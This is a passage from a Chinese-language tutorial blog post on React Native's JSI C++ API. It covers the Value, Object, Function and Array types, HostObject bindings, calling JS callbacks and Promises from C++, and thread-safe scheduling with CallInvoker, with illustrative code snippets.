  <span class="hljs-function">Object <span class="hljs-title">createObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{
    <span class="hljs-comment">// 调用 Hermes API 创建对象</span>
  }
};
</code></pre>
<h5 data-id="heading-9">Value - 通用 JS 值类型</h5>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Value</span> {
 <span class="hljs-keyword">private</span>:
  <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ValueKind</span> {
    UndefinedKind,
    NullKind,
    BooleanKind,
    NumberKind,
    SymbolKind,
    BigIntKind,
    StringKind,
    ObjectKind,
  };

  <span class="hljs-keyword">union</span> <span class="hljs-title class_">Data</span> {
    <span class="hljs-type">bool</span> boolean;
    <span class="hljs-type">double</span> number;
    Pointer pointer;  <span class="hljs-comment">// Symbol/String/Object</span>
  };

  ValueKind kind_;
  Data data_;  <span class="hljs-comment">// 8 字节（64 位）</span>
};
</code></pre>
<p><strong>类型检查与转换</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">processValue</span><span class="hljs-params">(Runtime&amp; runtime, <span class="hljs-type">const</span> Value&amp; value)</span> </span>{
  <span class="hljs-keyword">if</span> (value.<span class="hljs-built_in">isUndefined</span>()) {
    <span class="hljs-comment">// 处理 undefined</span>
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value.<span class="hljs-built_in">isNull</span>()) {
    <span class="hljs-comment">// 处理 null</span>
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value.<span class="hljs-built_in">isBool</span>()) {
    <span class="hljs-type">bool</span> b = value.<span class="hljs-built_in">getBool</span>();  <span class="hljs-comment">// 断言检查</span>
    <span class="hljs-type">bool</span> b2 = value.<span class="hljs-built_in">asBool</span>();  <span class="hljs-comment">// 抛出异常</span>
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value.<span class="hljs-built_in">isNumber</span>()) {
    <span class="hljs-type">double</span> d = value.<span class="hljs-built_in">getNumber</span>();
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value.<span class="hljs-built_in">isString</span>()) {
    String str = value.<span class="hljs-built_in">getString</span>(runtime);
    std::string utf8 = str.<span class="hljs-built_in">utf8</span>(runtime);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value.<span class="hljs-built_in">isObject</span>()) {
    Object obj = value.<span class="hljs-built_in">getObject</span>(runtime);
  }
}
</code></pre>
<h5 data-id="heading-10">Object - JS 对象</h5>
<p><strong>创建对象</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 1. 空对象</span>
<span class="hljs-function">Object <span class="hljs-title">obj</span><span class="hljs-params">(runtime)</span></span>;  <span class="hljs-comment">// 等价于 JS: {}</span>

<span class="hljs-comment">// 2. 带原型的对象</span>
Value proto = runtime.<span class="hljs-built_in">global</span>().<span class="hljs-built_in">getProperty</span>(runtime, <span class="hljs-string">"MyPrototype"</span>);
Object obj = Object::<span class="hljs-built_in">create</span>(runtime, proto);

<span class="hljs-comment">// 3. HostObject（C++ 对象）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHostObject</span> : <span class="hljs-keyword">public</span> HostObject {
  <span class="hljs-function">Value <span class="hljs-title">get</span><span class="hljs-params">(Runtime&amp; rt, <span class="hljs-type">const</span> PropNameID&amp; name)</span> <span class="hljs-keyword">override</span> </span>{
    <span class="hljs-keyword">if</span> (name.<span class="hljs-built_in">utf8</span>(rt) == <span class="hljs-string">"value"</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-built_in">Value</span>(<span class="hljs-number">42</span>);
    }
    <span class="hljs-keyword">return</span> Value::<span class="hljs-built_in">undefined</span>();
  }
};

<span class="hljs-keyword">auto</span> ho = std::<span class="hljs-built_in">make_shared</span>&lt;MyHostObject&gt;();
Object obj = Object::<span class="hljs-built_in">createFromHostObject</span>(runtime, ho);
</code></pre>
<p><strong>属性操作</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">Object <span class="hljs-title">obj</span><span class="hljs-params">(runtime)</span></span>;

<span class="hljs-comment">// 设置属性（支持多种类型）</span>
obj.<span class="hljs-built_in">setProperty</span>(runtime, <span class="hljs-string">"name"</span>, <span class="hljs-string">"John"</span>);  <span class="hljs-comment">// const char*</span>
obj.<span class="hljs-built_in">setProperty</span>(runtime, <span class="hljs-string">"age"</span>, <span class="hljs-number">30</span>);       <span class="hljs-comment">// int</span>
obj.<span class="hljs-built_in">setProperty</span>(runtime, <span class="hljs-string">"active"</span>, <span class="hljs-literal">true</span>);  <span class="hljs-comment">// bool</span>

<span class="hljs-comment">// 获取属性</span>
Value name = obj.<span class="hljs-built_in">getProperty</span>(runtime, <span class="hljs-string">"name"</span>);
<span class="hljs-keyword">if</span> (name.<span class="hljs-built_in">isString</span>()) {
  std::string str = name.<span class="hljs-built_in">getString</span>(runtime).<span class="hljs-built_in">utf8</span>(runtime);
}

<span class="hljs-comment">// 检查属性</span>
<span class="hljs-keyword">if</span> (obj.<span class="hljs-built_in">hasProperty</span>(runtime, <span class="hljs-string">"age"</span>)) {
  <span class="hljs-comment">// 属性存在</span>
}

<span class="hljs-comment">// 删除属性</span>
obj.<span class="hljs-built_in">deleteProperty</span>(runtime, <span class="hljs-string">"age"</span>);
</code></pre>
<h5 data-id="heading-11">Function - JS 函数</h5>
<p><strong>创建 C++ 函数供 JS 调用</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 定义 C++ lambda函数</span>
<span class="hljs-keyword">auto</span> myFunc = [](Runtime&amp; runtime,
                  <span class="hljs-type">const</span> Value&amp; thisVal,
                  <span class="hljs-type">const</span> Value* args,
                  <span class="hljs-type">size_t</span> count) -&gt; Value {
  <span class="hljs-comment">// 参数校验</span>
  <span class="hljs-keyword">if</span> (count &lt; <span class="hljs-number">2</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-built_in">JSError</span>(runtime, <span class="hljs-string">"Expected 2 arguments"</span>);
  }

  <span class="hljs-keyword">if</span> (!args[<span class="hljs-number">0</span>].<span class="hljs-built_in">isNumber</span>() || !args[<span class="hljs-number">1</span>].<span class="hljs-built_in">isNumber</span>()) {
    <span class="hljs-keyword">throw</span> <span class="hljs-built_in">JSError</span>(runtime, <span class="hljs-string">"Arguments must be numbers"</span>);
  }

  <span class="hljs-comment">// 执行逻辑</span>
  <span class="hljs-type">double</span> sum = args[<span class="hljs-number">0</span>].<span class="hljs-built_in">getNumber</span>() + args[<span class="hljs-number">1</span>].<span class="hljs-built_in">getNumber</span>();
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">Value</span>(sum);
};

<span class="hljs-comment">// 注册到全局对象</span>
<span class="hljs-keyword">auto</span> funcName = PropNameID::forAscii(runtime, <span class="hljs-string">"myAdd"</span>);
Function func = Function::<span class="hljs-built_in">createFromHostFunction</span>(
    runtime, funcName, <span class="hljs-number">2</span>, myFunc);

runtime.<span class="hljs-built_in">global</span>().<span class="hljs-built_in">setProperty</span>(runtime, <span class="hljs-string">"myAdd"</span>, func);

<span class="hljs-comment">// JS 中调用：</span>
<span class="hljs-comment">// const result = myAdd(10, 20);  // 30</span>
</code></pre>
<p><strong>从 C++ 调用 JS 函数</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 获取 JS 函数</span>
Value callback = obj.<span class="hljs-built_in">getProperty</span>(runtime, <span class="hljs-string">"onClick"</span>);
<span class="hljs-keyword">if</span> (callback.<span class="hljs-built_in">isObject</span>() &amp;&amp; callback.<span class="hljs-built_in">getObject</span>(runtime).<span class="hljs-built_in">isFunction</span>(runtime)) {
  Function func = callback.<span class="hljs-built_in">getObject</span>(runtime).<span class="hljs-built_in">getFunction</span>(runtime);

  <span class="hljs-comment">// 方式 1：无 this，传递参数</span>
  Value result = func.<span class="hljs-built_in">call</span>(runtime, <span class="hljs-built_in">Value</span>(<span class="hljs-number">10</span>), <span class="hljs-built_in">Value</span>(<span class="hljs-number">20</span>));

  <span class="hljs-comment">// 方式 2：带 this 上下文</span>
  <span class="hljs-function">Object <span class="hljs-title">thisObj</span><span class="hljs-params">(runtime)</span></span>;
  Value result2 = func.<span class="hljs-built_in">callWithThis</span>(runtime, thisObj, <span class="hljs-built_in">Value</span>(<span class="hljs-number">10</span>));

  <span class="hljs-comment">// 方式 3：作为构造函数调用</span>
  Value instance = func.<span class="hljs-built_in">callAsConstructor</span>(runtime, <span class="hljs-built_in">Value</span>(<span class="hljs-string">"arg1"</span>));
}
</code></pre>
<h5 data-id="heading-12">Array - JS 数组</h5>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 创建数组</span>
Array arr = Array::<span class="hljs-built_in">createWithElements</span>(runtime, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-string">"hello"</span>, <span class="hljs-literal">true</span>);

<span class="hljs-comment">// 访问元素</span>
<span class="hljs-type">size_t</span> length = arr.<span class="hljs-built_in">size</span>(runtime);
<span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; length; i++) {
  Value element = arr.<span class="hljs-built_in">getValueAtIndex</span>(runtime, i);
}

<span class="hljs-comment">// 修改元素</span>
arr.<span class="hljs-built_in">setValueAtIndex</span>(runtime, <span class="hljs-number">0</span>, <span class="hljs-built_in">Value</span>(<span class="hljs-number">100</span>));

<span class="hljs-comment">// 转换为普通 Object</span>
Object obj = arr.<span class="hljs-built_in">asObject</span>(runtime);  <span class="hljs-comment">// 类型安全转换</span>
</code></pre>
<h3 data-id="heading-13">JS与C++的调用机制</h3>
<h4 data-id="heading-14">HostObject</h4>
<p><code>HostObject</code>是一个非常重要的概念，它的作用就是将一个C++对象直接暴露给JS层使用。</p>
<p>更具体的说：</p>
<ul>
<li><code>HostObject</code> 是一个 <strong>C++ 类</strong>，完整的类是 <code>facebook::jsi::HostObject</code></li>
<li>你可以通过它把<strong>原生对象（例如图片、存储、数据库连接等）暴露给 JS</strong></li>
<li>JS 访问它的属性和方法时，看起来就像在用普通的 JS 对象</li>
</ul>
<p><strong>如何使用<code>HostObject</code>？</strong></p>
<h5 data-id="heading-15">1.在 C++ 中定义 HostObject：</h5>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NativeStorage</span> : <span class="hljs-keyword">public</span> facebook::jsi::HostObject {
<span class="hljs-keyword">public</span>:
  <span class="hljs-type">int</span> expirationTime = <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span>; <span class="hljs-comment">// 默认 1 天</span>

  <span class="hljs-comment">// 读属性：nativeStorage.xxx</span>
  <span class="hljs-function">jsi::Value <span class="hljs-title">get</span><span class="hljs-params">(jsi::Runtime&amp; runtime, <span class="hljs-type">const</span> jsi::PropNameID&amp; name)</span> <span class="hljs-keyword">override</span> </span>{
    <span class="hljs-keyword">auto</span> prop = name.<span class="hljs-built_in">utf8</span>(runtime);
    <span class="hljs-keyword">if</span> (prop == <span class="hljs-string">"expirationTime"</span>) {
      <span class="hljs-keyword">return</span> jsi::<span class="hljs-built_in">Value</span>(expirationTime);
    }

    <span class="hljs-comment">// 也可以在这里返回“方法”，例如 setObject / object（见后文）</span>
    <span class="hljs-comment">// 否则：</span>
    <span class="hljs-keyword">return</span> jsi::Value::<span class="hljs-built_in">undefined</span>();
  }

  <span class="hljs-comment">// 写属性：nativeStorage.xxx = ...</span>
  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">set</span><span class="hljs-params">(jsi::Runtime&amp; runtime, <span class="hljs-type">const</span> jsi::PropNameID&amp; name, <span class="hljs-type">const</span> jsi::Value&amp; value)</span> <span class="hljs-keyword">override</span> </span>{
    <span class="hljs-keyword">auto</span> prop = name.<span class="hljs-built_in">utf8</span>(runtime);
    <span class="hljs-keyword">if</span> (prop == <span class="hljs-string">"expirationTime"</span> &amp;&amp; value.<span class="hljs-built_in">isNumber</span>()) {
      expirationTime = (<span class="hljs-type">int</span>)value.<span class="hljs-built_in">asNumber</span>();
    }
  }
};
</code></pre>
<p>这里<code>get</code>方法相当于在定义：<strong>JS 中访问某个属性名时，底层到底要操作哪个 C++ 字段或执行什么逻辑</strong>。</p>
<h5 data-id="heading-16">2.把 HostObject 实例挂到 JS 运行时</h5>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">NativeStorage::install</span><span class="hljs-params">(jsi::Runtime&amp; runtime)</span> </span>{
  <span class="hljs-comment">// 创建NativeStorage对象</span>
  <span class="hljs-keyword">auto</span> instance = std::<span class="hljs-built_in">make_shared</span>&lt;NativeStorage&gt;();

  <span class="hljs-comment">// 再从 HostObject 创建 JS 对象</span>
  <span class="hljs-keyword">auto</span> object = jsi::Object::<span class="hljs-built_in">createFromHostObject</span>(runtime, instance);

  <span class="hljs-comment">// 挂到 global 上，供 JS 使用：global.nativeStorage</span>
  runtime.<span class="hljs-built_in">global</span>().<span class="hljs-built_in">setProperty</span>(runtime, <span class="hljs-string">"nativeStorage"</span>, object);
}
</code></pre>
<p>这个过程可以称为安装，在适当的时机（通常是 JS runtime 已经创建好之后），调用这个 <code>install</code> 就行。</p>
<h5 data-id="heading-17">3.在 JS 侧使用</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 属性读写：对应 C++ 中 get/set 覆写</span>
nativeStorage.<span class="hljs-property">expirationTime</span> = <span class="hljs-number">1000</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(nativeStorage.<span class="hljs-property">expirationTime</span>);  <span class="hljs-comment">// -&gt; 1000</span>
</code></pre>
<p>从 JS 视角看，这就是一个普通对象；从 C++ 视角看，它是一个持有原生资源和逻辑的类实例。</p>
<h5 data-id="heading-18">4.添加方法</h5>
<p><code>HostObject</code> 不只可以暴露数据属性，还可以在 <code>get()</code> 中给某个属性名返回一个 <strong>HostFunction</strong>，这样这个属性在 JS 中就是一个 <strong>可调用方法</strong>。</p>
<p>例如在上面 <code>NativeStorage</code> 的基础上，给它加上 <code>setObject</code> / <code>object</code> 方法：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">jsi::Value <span class="hljs-title">get</span><span class="hljs-params">(jsi::Runtime&amp; runtime, <span class="hljs-type">const</span> jsi::PropNameID&amp; name)</span> <span class="hljs-keyword">override</span> </span>{
  <span class="hljs-keyword">auto</span> prop = name.<span class="hljs-built_in">utf8</span>(runtime);

  <span class="hljs-keyword">if</span> (prop == <span class="hljs-string">"expirationTime"</span>) {
    <span class="hljs-keyword">return</span> jsi::<span class="hljs-built_in">Value</span>(expirationTime);
  }

  <span class="hljs-keyword">if</span> (prop == <span class="hljs-string">"setObject"</span>) {
    <span class="hljs-keyword">return</span> jsi::Function::<span class="hljs-built_in">createFromHostFunction</span>(
      runtime,
      jsi::PropNameID::forAscii(runtime, <span class="hljs-string">"setObject"</span>),
      <span class="hljs-number">2</span>, <span class="hljs-comment">// 参数个数：key, value</span>
      [](jsi::Runtime&amp; rt, <span class="hljs-type">const</span> jsi::Value&amp; thisVal,
         <span class="hljs-type">const</span> jsi::Value* args, <span class="hljs-type">size_t</span> count) -&gt; jsi::Value {
        <span class="hljs-comment">// 这里做参数转换 + 原生存储逻辑</span>
        <span class="hljs-comment">// 比如用 NSUserDefaults 或 SharedPreferences 等</span>
        <span class="hljs-keyword">return</span> jsi::<span class="hljs-built_in">Value</span>(<span class="hljs-literal">true</span>);
      }
    );
  }

  <span class="hljs-keyword">if</span> (prop == <span class="hljs-string">"object"</span>) {
    <span class="hljs-keyword">return</span> jsi::Function::<span class="hljs-built_in">createFromHostFunction</span>(
      runtime,
      jsi::PropNameID::forAscii(runtime, <span class="hljs-string">"object"</span>),
      <span class="hljs-number">1</span>,
      [](jsi::Runtime&amp; rt, <span class="hljs-type">const</span> jsi::Value&amp; thisVal,
         <span class="hljs-type">const</span> jsi::Value* args, <span class="hljs-type">size_t</span> count) -&gt; jsi::Value {
        <span class="hljs-comment">// 这里从原生存储中读取并返回</span>
        <span class="hljs-comment">// return jsi::String::createFromUtf8(rt, ...);</span>
        <span class="hljs-keyword">return</span> jsi::Value::<span class="hljs-built_in">undefined</span>();
      }
    );
  }

  <span class="hljs-keyword">return</span> jsi::Value::<span class="hljs-built_in">undefined</span>();
}
</code></pre>
<p>那么在JS 层就可以这样使用：</p>
<pre><code class="hljs language-js" lang="js">nativeStorage.<span class="hljs-title function_">setObject</span>(<span class="hljs-string">'greeting'</span>, <span class="hljs-string">'Hello JSI!'</span>);
<span class="hljs-keyword">const</span> text = nativeStorage.<span class="hljs-title function_">object</span>(<span class="hljs-string">'greeting'</span>);
</code></pre>
<h4 data-id="heading-19">C++ 调用JS</h4>
<p>调用 JS 函数，大概可以分两种情况，分别是回调函数和Promise 交互</p>
<h5 data-id="heading-20">回调函数</h5>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">registerClickHandler</span><span class="hljs-params">(Runtime&amp; runtime)</span> </span>{
  <span class="hljs-comment">// 获取 JS 回调</span>
  Value onClickValue = runtime.<span class="hljs-built_in">global</span>().<span class="hljs-built_in">getProperty</span>(runtime, <span class="hljs-string">"onClick"</span>);

  <span class="hljs-keyword">if</span> (!onClickValue.<span class="hljs-built_in">isObject</span>()) {
    <span class="hljs-keyword">throw</span> <span class="hljs-built_in">JSError</span>(runtime, <span class="hljs-string">"onClick is not defined"</span>);
  }

  Object onClickObj = onClickValue.<span class="hljs-built_in">getObject</span>(runtime);
  <span class="hljs-keyword">if</span> (!onClickObj.<span class="hljs-built_in">isFunction</span>(runtime)) {
    <span class="hljs-keyword">throw</span> <span class="hljs-built_in">JSError</span>(runtime, <span class="hljs-string">"onClick is not a function"</span>);
  }

  Function onClick = onClickObj.<span class="hljs-built_in">getFunction</span>(runtime);

  <span class="hljs-comment">// C++ 事件触发时调用</span>
  <span class="hljs-comment">// 必须在 JS 线程执行</span>
  onClick.<span class="hljs-built_in">call</span>(runtime, 
      String::<span class="hljs-built_in">createFromAscii</span>(runtime, <span class="hljs-string">"button1"</span>),
      <span class="hljs-built_in">Value</span>(<span class="hljs-number">100</span>),  <span class="hljs-comment">// x</span>
      <span class="hljs-built_in">Value</span>(<span class="hljs-number">200</span>)); <span class="hljs-comment">// y</span>
}
</code></pre>
<h5 data-id="heading-21">Promise 交互</h5>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">Value <span class="hljs-title">createPromise</span><span class="hljs-params">(Runtime&amp; runtime)</span> </span>{
  <span class="hljs-comment">// 获取 Promise 构造函数</span>
  Object promiseConstructor = runtime.<span class="hljs-built_in">global</span>()
      .<span class="hljs-built_in">getPropertyAsObject</span>(runtime, <span class="hljs-string">"Promise"</span>);

  <span class="hljs-comment">// 创建 executor 函数</span>
  <span class="hljs-keyword">auto</span> executor = [](Runtime&amp; rt, <span class="hljs-type">const</span> Value&amp;, <span class="hljs-type">const</span> Value* args, <span class="hljs-type">size_t</span> count) {
    Function resolve = args[<span class="hljs-number">0</span>].<span class="hljs-built_in">getObject</span>(rt).<span class="hljs-built_in">getFunction</span>(rt);
    Function reject = args[<span class="hljs-number">1</span>].<span class="hljs-built_in">getObject</span>(rt).<span class="hljs-built_in">getFunction</span>(rt);

    <span class="hljs-comment">// 模拟异步操作</span>
    std::<span class="hljs-built_in">thread</span>([&amp;rt, resolve = std::<span class="hljs-built_in">move</span>(resolve)]() <span class="hljs-keyword">mutable</span> {
      std::this_thread::<span class="hljs-built_in">sleep_for</span>(std::chrono::<span class="hljs-built_in">seconds</span>(<span class="hljs-number">1</span>));

      <span class="hljs-comment">// 实际需要 MessageQueue 调度</span>
      resolve.<span class="hljs-built_in">call</span>(rt, <span class="hljs-built_in">Value</span>(<span class="hljs-number">42</span>));
    }).<span class="hljs-built_in">detach</span>();

    <span class="hljs-keyword">return</span> Value::<span class="hljs-built_in">undefined</span>();
  };

  Function executorFunc = Function::<span class="hljs-built_in">createFromHostFunction</span>(
      runtime,
      PropNameID::forAscii(runtime, <span class="hljs-string">"executor"</span>),
      <span class="hljs-number">2</span>,
      executor);

  <span class="hljs-comment">// 调用 new Promise(executor)</span>
  <span class="hljs-keyword">return</span> promiseConstructor.<span class="hljs-built_in">asFunction</span>(runtime)
      .<span class="hljs-built_in">callAsConstructor</span>(runtime, executorFunc);
}
</code></pre>
<h5 data-id="heading-22">访问 JS 对象属性</h5>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">opObject</span><span class="hljs-params">(Runtime&amp; runtime, <span class="hljs-type">const</span> Object&amp; obj)</span> </span>{
  <span class="hljs-comment">// 1. 获取所有属性名</span>
  Array propNames = obj.<span class="hljs-built_in">getPropertyNames</span>(runtime);
  <span class="hljs-type">size_t</span> length = propNames.<span class="hljs-built_in">size</span>(runtime);

  std::cout &lt;&lt; <span class="hljs-string">"Object properties:"</span> &lt;&lt; std::endl;
  <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; length; i++) {
    Value nameValue = propNames.<span class="hljs-built_in">getValueAtIndex</span>(runtime, i);
    <span class="hljs-keyword">if</span> (nameValue.<span class="hljs-built_in">isString</span>()) {
      std::string name = nameValue.<span class="hljs-built_in">getString</span>(runtime).<span class="hljs-built_in">utf8</span>(runtime);

      <span class="hljs-comment">// 2. 获取属性值</span>
      Value propValue = obj.<span class="hljs-built_in">getProperty</span>(runtime, name.<span class="hljs-built_in">c_str</span>());

      <span class="hljs-comment">// 3. 类型判断</span>
      std::string type;
      <span class="hljs-keyword">if</span> (propValue.<span class="hljs-built_in">isUndefined</span>()) type = <span class="hljs-string">"undefined"</span>;
      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (propValue.<span class="hljs-built_in">isNull</span>()) type = <span class="hljs-string">"null"</span>;
      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (propValue.<span class="hljs-built_in">isBool</span>()) type = <span class="hljs-string">"boolean"</span>;
      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (propValue.<span class="hljs-built_in">isNumber</span>()) type = <span class="hljs-string">"number"</span>;
      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (propValue.<span class="hljs-built_in">isString</span>()) type = <span class="hljs-string">"string"</span>;
      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (propValue.<span class="hljs-built_in">isObject</span>()) type = <span class="hljs-string">"object"</span>;

      std::cout &lt;&lt; <span class="hljs-string">"  "</span> &lt;&lt; name &lt;&lt; <span class="hljs-string">": "</span> &lt;&lt; type &lt;&lt; std::endl;
    }
  }
}
</code></pre>
<h3 data-id="heading-23">线程安全</h3>
<p>由于JSI并不是线程安全的，如果直接在子线程调用JSI的相关接口，会导致闪退。因此，在使用JSI时，线程安全问题十分重要，必须谨慎。</p>
<ul>
<li><code>jsi::Runtime</code> 的实现（Hermes/JSC/V8）其内部状态、GC、对象分配都不是线程安全的</li>
<li>必须保证所有 JSI 操作在<strong>单一 JS 线程</strong>上串行执行</li>
<li>跨线程访问会导致数据竞争、内存损坏、崩溃</li>
</ul>
<p>我们来看一下JSI提供的解决方案，源码<code>react-native/packages/react-native/ReactCommon/callinvoker/ReactCommon/CallInvoker.h</code>：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CallInvoker</span> {
 <span class="hljs-keyword">public</span>:
  <span class="hljs-comment">// 异步调度到 JS 线程（最常用）</span>
  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">invokeAsync</span><span class="hljs-params">(std::function&lt;<span class="hljs-type">void</span>(jsi::Runtime&amp;)&gt;&amp;&amp; func)</span> <span class="hljs-keyword">noexcept</span> </span>= <span class="hljs-number">0</span>;
  
  <span class="hljs-comment">// 同步调用（阻塞当前线程直到 JS 线程执行完成）</span>
  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">invokeSync</span><span class="hljs-params">(std::function&lt;<span class="hljs-type">void</span>(jsi::Runtime&amp;)&gt;&amp;&amp; func)</span> </span>= <span class="hljs-number">0</span>;
  
  <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">CallInvoker</span>() = <span class="hljs-keyword">default</span>;
};
</code></pre>
<p>也就是说，我们必须通过<code>invokeAsync</code>把执行相关JSI操作的闭包发送到JS线程执行。这里的<code>invokeAsync</code>可以从任意线程安全调用，不阻塞JS线程。注意，JS线程的阻塞，会直接导致UI的卡顿。</p>
<p>接下来，我们看一个结合Promise的JSI异步线程处理的完整示例：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;jsi/jsi.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ReactCommon/CallInvoker.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;chrono&gt;</span></span>

<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> facebook::jsi;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkModule</span> : <span class="hljs-keyword">public</span> jsi::HostObject {
 <span class="hljs-keyword">private</span>:
  std::shared_ptr&lt;CallInvoker&gt; jsInvoker_;

 <span class="hljs-keyword">public</span>:
  <span class="hljs-built_in">NetworkModule</span>(std::shared_ptr&lt;CallInvoker&gt; jsInvoker) 
      : <span class="hljs-built_in">jsInvoker_</span>(std::<span class="hljs-built_in">move</span>(jsInvoker)) {}

  <span class="hljs-function">Value <span class="hljs-title">get</span><span class="hljs-params">(Runtime&amp; runtime, <span class="hljs-type">const</span> PropNameID&amp; name)</span> <span class="hljs-keyword">override</span> </span>{
    <span class="hljs-keyword">auto</span> methodName = name.<span class="hljs-built_in">utf8</span>(runtime);
  
    <span class="hljs-keyword">if</span> (methodName == <span class="hljs-string">"fetchAsync"</span>) {
      <span class="hljs-keyword">return</span> unction::<span class="hljs-built_in">createFromHostFunction</span>(
          runtime,
          name,
          <span class="hljs-number">1</span>,
          [<span class="hljs-keyword">this</span>](Runtime&amp; rt, <span class="hljs-type">const</span> Value&amp;, <span class="hljs-type">const</span> Value* args, <span class="hljs-type">size_t</span> count) -&gt; Value {
            std::string url = args[<span class="hljs-number">0</span>].<span class="hljs-built_in">getString</span>(rt).<span class="hljs-built_in">utf8</span>(rt);
        
            <span class="hljs-comment">// 1. 获取 Promise 构造函数</span>
            Object promiseConstructor = rt.<span class="hljs-built_in">global</span>().<span class="hljs-built_in">getPropertyAsObject</span>(rt, <span class="hljs-string">"Promise"</span>);
        
            <span class="hljs-comment">// 2. 创建 executor 函数</span>
            <span class="hljs-keyword">auto</span> executor = Function::<span class="hljs-built_in">createFromHostFunction</span>(
                rt,
                PropNameID::forAscii(rt, <span class="hljs-string">"executor"</span>),
                <span class="hljs-number">2</span>,
                [<span class="hljs-keyword">this</span>, url](Runtime&amp; runtime, <span class="hljs-type">const</span> Value&amp;, <span class="hljs-type">const</span> Value* args, <span class="hljs-type">size_t</span>) -&gt; Value {
                  <span class="hljs-comment">// 3. 保存 resolve/reject（使用 shared_ptr 延长生命周期）</span>
                  <span class="hljs-keyword">auto</span> resolve = std::<span class="hljs-built_in">make_shared</span>&lt;Function&gt;(
                      args[<span class="hljs-number">0</span>].<span class="hljs-built_in">getObject</span>(rt).<span class="hljs-built_in">getFunction</span>(rt));
                  <span class="hljs-keyword">auto</span> reject = std::<span class="hljs-built_in">make_shared</span>&lt;Function&gt;(
                      args[<span class="hljs-number">1</span>].<span class="hljs-built_in">getObject</span>(rt).<span class="hljs-built_in">getFunction</span>(rt));
              
                  <span class="hljs-comment">// 4. 后台线程执行</span>
                  std::<span class="hljs-built_in">thread</span>([<span class="hljs-keyword">this</span>, resolve, reject, url]() {
                    <span class="hljs-keyword">try</span> {
                      <span class="hljs-comment">// 模拟网络请求</span>
                      std::this_thread::<span class="hljs-built_in">sleep_for</span>(std::chrono::<span class="hljs-built_in">seconds</span>(<span class="hljs-number">1</span>));
                      std::string result = <span class="hljs-string">"Response from "</span> + url;
                  
                      <span class="hljs-comment">// 5. 调度到 JS 线程</span>
                      jsInvoker_-&gt;<span class="hljs-built_in">invokeAsync</span>([resolve, result](Runtime&amp; rt) {
                        <span class="hljs-comment">// createFromUtf8 这类JSI API必须在JS线程执行</span>
                        resolve-&gt;<span class="hljs-built_in">call</span>(rt, String::<span class="hljs-built_in">createFromUtf8</span>(rt, result));
                      });
                    } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> std::exception&amp; e) {
                      jsInvoker_-&gt;<span class="hljs-built_in">invokeAsync</span>([reject, msg = std::<span class="hljs-built_in">string</span>(e.<span class="hljs-built_in">what</span>())](Runtime&amp; rt) {
                        reject-&gt;<span class="hljs-built_in">call</span>(rt, String::<span class="hljs-built_in">createFromUtf8</span>(rt, msg));
                      });
                    }
                  }).<span class="hljs-built_in">detach</span>();
              
                  <span class="hljs-keyword">return</span> Value::<span class="hljs-built_in">undefined</span>();
                });
        
            <span class="hljs-comment">// 6. 返回 new Promise(executor)</span>
            <span class="hljs-keyword">return</span> promiseConstructor.<span class="hljs-built_in">asFunction</span>(rt).<span class="hljs-built_in">callAsConstructor</span>(rt, executor);
          });
